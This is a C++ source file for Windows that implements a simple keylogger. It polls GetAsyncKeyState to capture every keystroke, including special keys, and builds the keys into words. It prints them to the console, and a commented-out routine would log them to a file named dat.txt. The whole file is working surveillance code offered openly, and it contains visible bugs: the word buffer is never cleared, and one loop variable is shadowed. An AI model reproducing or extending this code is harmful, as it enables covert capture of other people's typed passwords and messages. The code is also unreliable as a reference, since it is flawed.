#define _WIN32_WINNT 0x0500
#include <Windows.h>
#include <string>
#include <stdlib.h>
#include <stdio.h>
#include <iostream>
#include <fstream>

/*
void LOG(string input) {
    fstream LogFile;
    LogFile.open("dat.txt", fstream::app);
    if (LogFile.is_open()) {
        LogFile << input;
        LogFile.close();
    }
}
*/

bool SpecialKeys(int S_Key) {
    switch (S_Key) {
    case VK_SPACE:
        std::cout << " ";
        return true;
    case VK_RETURN:
        std::cout << "\n";
        return true;
    case '¾':
        std::cout << ".";
        // LOG(".");
        return true;
    case VK_SHIFT:
        std::cout << "#SHIFT#";
        // LOG("#SHIFT#");
        return true;
    case VK_BACK:
        std::cout << "\b";
        // LOG("\b");
        return true;
    case VK_RBUTTON:
        std::cout << "#R_CLICK#";
        // LOG("#R_CLICK#");
        return true;
    case VK_CAPITAL:
        std::cout << "#CAPS_LOCK#";
        // LOG("#CAPS_LCOK");
        return true;
    case VK_TAB:
        std::cout << "#TAB";
        // LOG("#TAB");
        return true;
    case VK_UP:
        std::cout << "#UP";
        // LOG("#UP_ARROW_KEY");
        return true;
    case VK_DOWN:
        std::cout << "#DOWN";
        // LOG("#DOWN_ARROW_KEY");
        return true;
    case VK_LEFT:
        std::cout << "#LEFT";
        // LOG("#LEFT_ARROW_KEY");
        return true;
    case VK_RIGHT:
        std::cout << "#RIGHT";
        // LOG("#RIGHT_ARROW_KEY");
        return true;
    case VK_CONTROL:
        std::cout << "#CONTROL";
        // LOG("#CONTROL");
        return true;
    case VK_MENU:
        std::cout << "#ALT";
        // LOG("#ALT");
        return true;
    default:
        return false;
    }
}

class KeyLogger {
    public: char** words;
    public: static void start()
    {
        std::string word;
        while (true) {
            Sleep(10);
            char character = KeyLogger::catchChar();
            word = KeyLogger::buildWord(character, word);
            /*char character = KeyLogger::catchChar();
            if (character == ' ') {
                std::cout << word;
                word = "";
                continue;
            }
            if (character != NULL) word = word + character;*/
        }
    }
    public: static std::string buildWord(char character,  std::string word)
    {
        if (character == ' ') {
            std::cout << word;
            return word;
        }
        if (character != NULL) word = word + character;
        return word;
    }
    public: static char catchChar()
    {
        char KEY = 'x';
        for (int KEY = 8; KEY <= 190; KEY++)
        {
            if (GetAsyncKeyState(KEY) == -32767) {
                return char(KEY);
            }
        }
        return NULL;
    }
};

int main()
{
    KeyLogger::start();
    return 0;
}
